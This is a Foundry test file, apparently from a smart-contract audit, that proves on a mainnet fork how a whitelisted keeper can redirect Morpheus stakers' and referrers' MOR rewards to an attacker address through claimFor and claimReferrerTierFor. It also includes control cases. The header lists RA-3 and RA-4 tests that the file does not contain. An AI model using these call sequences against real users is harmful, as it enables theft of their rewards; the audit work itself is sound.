// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ============================================================================
// RESCAN Lane R-A — Ethereum Capital stack, NEW angles (prior audit 2026-11-03
// excluded: A-1 donation steering itself is used ONLY as a harness to create
// claimable rewards; the bugs under test are in the claim-routing logic).
//
// RA-1: DepositPool.claimFor — a whitelisted claim-sender can redirect a
//       staker's MOR rewards to ANY address when the staker has not set a
//       claimReceiver. The whitelist (setClaimSender) authorises TRIGGERING a
//       claim; nothing binds the payout address to the staker.
// RA-2: DepositPool.claimReferrerTierFor — same pattern for referrer-tier
//       rewards: whitelisted caller chooses the receiver freely.
// RA-3 (control): JIT stake after a distribution captures nothing retroactive.
// RA-4 (control): one stale ChainLink feed freezes distributeRewards/stake.
//
// Fork: Ethereum mainnet, pinned block 26,329,065 (distribution for index 0
// already due: lastCalculatedTimestamp 1793531771, 114,492 s elapsed). This is
// the filing A-1 pin, proven reproducible on the free archive RPC; newer pins
// hit drpc fork-backend timestamp inconsistency (block 26,353,100 served with
// block.timestamp ~23 h ahead of the canonical header).
// Feed-freshness handling reuses the filing A-1 technique: after each warp,
// ONLY the external aggregators' latestRoundData is re-mocked to the SAME
// answer read at the pinned block with updatedAt = current ts (a live
// heartbeat republication). No Morpheus contract is mocked.
// ============================================================================

import {Test} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {console} from "forge-std/console.sol";

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function depositPools(uint256 rewardPoolIndex_, address depositPoolAddress_)
        external
        view
        returns (
            address token,
            string memory chainLinkPath,
            uint256 tokenPrice,
            uint256 deposited,
            uint256 lastUnderlyingBalance,
            uint8 strategy,
            address aToken,
            bool isExist
        );
    function chainLinkDataConsumer() external view returns (address);
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function claim(uint256 rewardPoolIndex_, address receiver_) external payable;
    function claimFor(uint256 rewardPoolIndex_, address staker_, address receiver_) external payable;
    function claimReferrerTierFor(uint256 rewardPoolIndex_, address referrer_, address receiver_) external payable;
    function setClaimSender(uint256 rewardPoolIndex_, address[] calldata senders_, bool[] calldata isAllowed_) external;
    function setClaimReceiver(uint256 rewardPoolIndex_, address receiver_) external;
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function getLatestReferrerReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
}

interface IConsumer {
    function getPathId(string memory path_) external pure returns (bytes32);
    function dataFeeds(bytes32 pathId_, uint256 index_) external view returns (address);
    function getChainLinkDataFeedLatestAnswer(bytes32 pathId_) external view returns (uint256);
}

interface IAggregator {
    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
}

interface IStETH {
    function submit(address referral_) external payable returns (uint256);
}

interface IAavePool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

contract RescanRATest is Test {
    uint256 internal constant FORK_BLOCK = 26329065;

    IDistributor internal distributor = IDistributor(0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A);
    IDepositPool internal dpUSDT = IDepositPool(0x3B51989212BEdaB926794D6bf8e9E991218cf116);
    IDepositPool internal dpStETH = IDepositPool(0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790);
    IERC20 internal usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 internal steth = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    address internal constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    address internal staker = makeAddr("staker");
    address internal keeper = makeAddr("keeper");
    address internal attacker = makeAddr("attacker");
    address internal stranger = makeAddr("stranger");
    address internal referrer = makeAddr("referrer");

    address[] internal pools;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        pools.push(0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790);
        pools.push(0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384);
        pools.push(0xdE283F8309Fd1AA46c95d299f6B8310716277A42);
        pools.push(0x6cCE082851Add4c535352f596662521B4De4750E);
        pools.push(0x3B51989212BEdaB926794D6bf8e9E991218cf116);
    }


    /// USDT-safe approve (USDT returns no bool; high-level IERC20 approve reverts on decode).
    function _approveUSDT(address spender, uint256 amount) internal {
        (bool ok, bytes memory d) = address(usdt).call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
        require(ok && (d.length == 0 || abi.decode(d, (bool))), "usdt approve failed");
    }

    /// Re-mock every external aggregator behind the consumer with the SAME
    /// answer it returned at the pinned block, updatedAt = now (heartbeat).
    function _refreshFeeds() internal {
        IConsumer consumer = IConsumer(distributor.chainLinkDataConsumer());
        for (uint256 i = 0; i < pools.length; i++) {
            (, string memory path_, , , , , , ) = distributor.depositPools(0, pools[i]);
            bytes32 pid = consumer.getPathId(path_);
            for (uint256 k = 0; k < 4; k++) {
                address feed;
                try consumer.dataFeeds(pid, k) returns (address f) {
                    feed = f;
                } catch {
                    break;
                }
                if (feed == address(0)) break;
                (uint80 rid, int256 ans, uint256 started, , uint80 air) = IAggregator(feed).latestRoundData();
                vm.mockCall(
                    feed,
                    abi.encodeWithSelector(IAggregator.latestRoundData.selector),
                    abi.encode(rid, ans, started, block.timestamp, air)
                );
            }
        }
    }

    /// Manufacture claimable rewards for `staker` in the USDT pool using the
    /// already-known A-1 harness (donation), purely as test setup.
    function _fundRewardsUSDT() internal returns (uint256 pending_) {
        deal(address(usdt), staker, 200_500e6);
        vm.startPrank(staker);
        _approveUSDT(address(distributor), type(uint256).max);
        _approveUSDT(address(dpUSDT), type(uint256).max);
        dpUSDT.stake(0, 200_000e6, 0, address(0));
        vm.stopPrank();

        // Harness donation (A-1 mechanism, already reported): 500 USDT.
        IAavePool(AAVE_POOL).supply(address(usdt), 500e6, address(distributor), 0);
        // NOTE: supply pulls from msg.sender = this test contract.
        vm.warp(block.timestamp + 86_401);
        _refreshFeeds();
        distributor.distributeRewards(0);
        pending_ = dpUSDT.getLatestUserReward(0, staker);
    }

    // ------------------------------------------------------------------ RA-1
    function test_RA1_ClaimForRedirect() public {
        // The test contract funds the donation; give it USDT for the supply.
        deal(address(usdt), address(this), 500e6);
        _approveUSDT(AAVE_POOL, type(uint256).max);

        uint256 pending_ = _fundRewardsUSDT();
        console.log("RA-1 staker pending (MOR wei):", pending_);
        assertGt(pending_, 1_000 ether, "harness: pending too small");

        // Pass the claim locks (14d after stake / after claim).
        vm.warp(block.timestamp + 14 days);
        _refreshFeeds();

        // Staker whitelists the keeper to TRIGGER claims (no claimReceiver set).
        address[] memory senders = new address[](1);
        senders[0] = keeper;
        bool[] memory allowed = new bool[](1);
        allowed[0] = true;
        vm.prank(staker);
        dpUSDT.setClaimSender(0, senders, allowed);
        assertEq(dpUSDT.getLatestUserReward(0, staker), pending_, "pending changed by whitelist");

        uint256 snap = vm.snapshotState();

        // CONTROL A: a non-whitelisted caller cannot claimFor at all.
        vm.deal(stranger, 2 ether);
        vm.prank(stranger);
        vm.expectRevert(bytes("DS: invalid caller"));
        dpUSDT.claimFor{value: 1 ether}(0, staker, stranger);
        console.log("RA-1 control A PASS: stranger claimFor reverts");

        // ATTACK: the whitelisted keeper redirects the payout to `attacker`.
        vm.deal(keeper, 2 ether);
        vm.recordLogs();
        vm.prank(keeper);
        dpUSDT.claimFor{value: 1 ether}(0, staker, attacker);
        Vm.Log[] memory logs = vm.getRecordedLogs();
        // UserClaimed names the staker, not the payout receiver; the redirect
        // evidence is MintMessageSent(indexed receiver, amount) from L1SenderV2.
        bytes32 mintTopic = keccak256("MintMessageSent(address,uint256)");
        bool found;
        uint256 claimedAmt;
        address mintReceiver;
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics.length > 0 && logs[i].topics[0] == mintTopic) {
                (mintReceiver, claimedAmt) = abi.decode(logs[i].data, (address, uint256));
                found = true;
            }
        }
        assertTrue(found, "no MintMessageSent event");
        console.log("RA-1 attack: mint receiver:", mintReceiver);
        console.log("RA-1 attack: mint amount (MOR wei):", claimedAmt);
        assertEq(mintReceiver, attacker, "payout NOT redirected to attacker");
        assertGe(claimedAmt, pending_, "claimed amount < staker pre-claim pending");
        assertEq(dpUSDT.getLatestUserReward(0, staker), 0, "staker pending not drained");
        console.log("RA-1 ATTACK PASS: keeper redirected full pending to attacker");

        // CONTROL B: with claimReceiver set, the keeper's receiver param is ignored.
        vm.revertToState(snap);
        vm.prank(staker);
        dpUSDT.setClaimReceiver(0, staker);
        vm.deal(keeper, 2 ether);
        vm.recordLogs();
        vm.prank(keeper);
        dpUSDT.claimFor{value: 1 ether}(0, staker, attacker);
        logs = vm.getRecordedLogs();
        found = false;
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics.length > 0 && logs[i].topics[0] == mintTopic) {
                (mintReceiver, ) = abi.decode(logs[i].data, (address, uint256));
                found = true;
            }
        }
        assertTrue(found, "no MintMessageSent event (control B)");
        assertEq(mintReceiver, staker, "claimReceiver not honoured");
        console.log("RA-1 control B PASS: claimReceiver overrides caller-supplied receiver");
    }



    // ------------------------------------------------------------------ RA-2
    function test_RA2_ReferrerTierRedirect() public {
        // Referred staker stakes 5 stETH (tier-0 threshold = 1 stETH) naming `referrer`.
        address rstaker = makeAddr("rstaker");
        // stETH balance is share-derived (deal() cannot write it): wrap via Lido.
        vm.deal(rstaker, 6 ether);
        vm.prank(rstaker);
        IStETH(address(steth)).submit{value: 6 ether}(address(0));
        vm.startPrank(rstaker);
        steth.approve(address(distributor), type(uint256).max);
        dpStETH.stake(0, 5 ether, 0, referrer);
        vm.stopPrank();

        // Manufacture DP_stETH yield: donate 1 stETH to the DISTRIBUTOR
        // (strategy NONE -> yield = growth of the Distributor's own token
        // balance, DistributorV2._distributeRewards). A-1 harness only.
        vm.deal(address(this), 1 ether);
        IStETH(address(steth)).submit{value: 1 ether}(address(0));
        steth.transfer(address(distributor), 1 ether);

        vm.warp(block.timestamp + 86_401);
        _refreshFeeds();
        distributor.distributeRewards(0);

        uint256 refPending = dpStETH.getLatestReferrerReward(0, referrer);
        console.log("RA-2 referrer pending (MOR wei):", refPending);
        assertGt(refPending, 0, "harness: no referrer pending");

        vm.warp(block.timestamp + 14 days);
        _refreshFeeds();

        // Referrer whitelists keeper to TRIGGER tier claims (no claimReceiver set).
        address[] memory senders = new address[](1);
        senders[0] = keeper;
        bool[] memory allowed = new bool[](1);
        allowed[0] = true;
        vm.prank(referrer);
        dpStETH.setClaimSender(0, senders, allowed);

        uint256 snap = vm.snapshotState();

        // CONTROL: non-whitelisted caller cannot claimReferrerTierFor at all.
        vm.deal(stranger, 2 ether);
        vm.prank(stranger);
        vm.expectRevert(bytes("DS: invalid caller"));
        dpStETH.claimReferrerTierFor{value: 1 ether}(0, referrer, stranger);
        console.log("RA-2 control PASS: stranger claimReferrerTierFor reverts");
        vm.revertToState(snap);

        // ATTACK: the whitelisted keeper redirects the referrer's tier rewards.
        vm.deal(keeper, 2 ether);
        vm.recordLogs();
        vm.prank(keeper);
        dpStETH.claimReferrerTierFor{value: 1 ether}(0, referrer, attacker);
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 mintTopic = keccak256("MintMessageSent(address,uint256)");
        bool found;
        address mintReceiver;
        uint256 mintAmt;
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics.length > 0 && logs[i].topics[0] == mintTopic) {
                (mintReceiver, mintAmt) = abi.decode(logs[i].data, (address, uint256));
                found = true;
            }
        }
        assertTrue(found, "no MintMessageSent event");
        console.log("RA-2 attack: mint receiver:", mintReceiver);
        console.log("RA-2 attack: mint amount (MOR wei):", mintAmt);
        assertEq(mintReceiver, attacker, "referrer payout NOT redirected to attacker");
        assertGe(mintAmt, refPending, "mint amount < referrer pre-claim pending");
        assertEq(dpStETH.getLatestReferrerReward(0, referrer), 0, "referrer pending not drained");
        console.log("RA-2 ATTACK PASS: keeper redirected referrer tier rewards to attacker");
    }
}
